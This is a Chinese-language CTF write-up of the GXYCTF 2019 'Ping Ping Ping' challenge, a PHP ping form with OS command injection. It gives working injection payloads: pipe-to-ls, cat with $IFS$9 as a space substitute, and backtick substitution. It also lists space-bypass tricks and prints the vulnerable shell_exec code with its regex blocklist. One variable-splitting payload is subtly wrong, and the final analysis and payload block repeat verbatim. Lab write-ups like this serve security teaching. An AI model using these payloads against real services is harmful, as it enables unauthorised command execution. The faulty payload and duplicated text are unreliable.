```
代替空格 < 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
```


eg:
## GXYCTF 2019]Ping Ping Ping

输入提示输入的网址之后，返回的结果是ping之后都结果

想起来之前学的管道符” | “

127.0.0.1|ls

显示：

```
flag.php
index.php
```

  

  

输入：  
127.0.0.1|cat flag.php

显示：

fxck your space!

过滤了空格

```
代替空格
< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
```

发现过滤了：

```
> <，（），flag
```

  

先看index.php

输入：127.0.0.1|cat$IFS$9index.php

显示：

```
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
			print_r($match);
			print($ip);
			echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
			die("fxck your symbol!");
		}
		else if(preg_match("/ /", $ip)){
			die("fxck your space!");
		}
		else if(preg_match("/bash/", $ip)){
			die("fxck your bash!");
		}
		else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
			die("fxck your flag!");
		}
		$a = shell_exec("ping -c 4 ".$ip);
		echo "
		
";
		print_r($a);
	}

	?>
```

  代码分析：过滤了一堆符号

```
flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母
if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
```

尝试：

```
?ip=127.0.0.1|cat$IFS$9`ls`
或
?ip=127.0.0.1;a=f;cat$IFS$1$alag.php 
查看源码找到flag
```
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

  

代码分析：过滤了一堆符号

```
flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母
if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
```

  
  

  

尝试：

```
?ip=127.0.0.1|cat$IFS$9`ls`
或
?ip=127.0.0.1;a=f;cat$IFS$1$alag.php 
查看源码找到flag
```